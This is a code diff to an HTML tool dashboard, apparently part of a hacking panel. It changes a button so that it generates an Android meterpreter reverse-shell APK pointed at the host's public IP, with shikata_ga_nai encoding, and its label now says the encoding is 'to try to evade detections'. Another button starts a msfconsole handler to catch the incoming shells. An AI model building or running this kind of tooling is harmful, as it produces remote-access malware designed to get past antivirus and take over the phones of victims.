@@ -230,9 +230,9 @@
 
         <div class="tool-category">
             <span class="category-title">Mobile Experimentation</span>
-            <div class="tool-card" onclick="runCommand('msfvenom -p android/meterpreter/reverse_tcp LHOST=$(curl -s ifconfig.me) LPORT=4444 -o scripts/lab_test.apk')">
-                <span class="tool-name">Gen Mobile Lab APK</span>
-                <span class="tool-desc">Genera un APK de prueba para tu propio teléfono (Uso educativo).</span>
+            <div class="tool-card" onclick="runCommand('msfvenom -p android/meterpreter/reverse_tcp LHOST=$(curl -s ifconfig.me) LPORT=4444 -e x86/shikata_ga_nai -i 10 -f raw -o scripts/lab_test_encoded.apk')">
+                <span class="tool-name">Gen Encoded APK</span>
+                <span class="tool-desc">Genera un APK con codificación avanzada para intentar evadir detecciones.</span>
             </div>
             <div class="tool-card" onclick="runCommand('msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD android/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; exploit\"')">
                 <span class="tool-name">Start Mobile Listener</span>
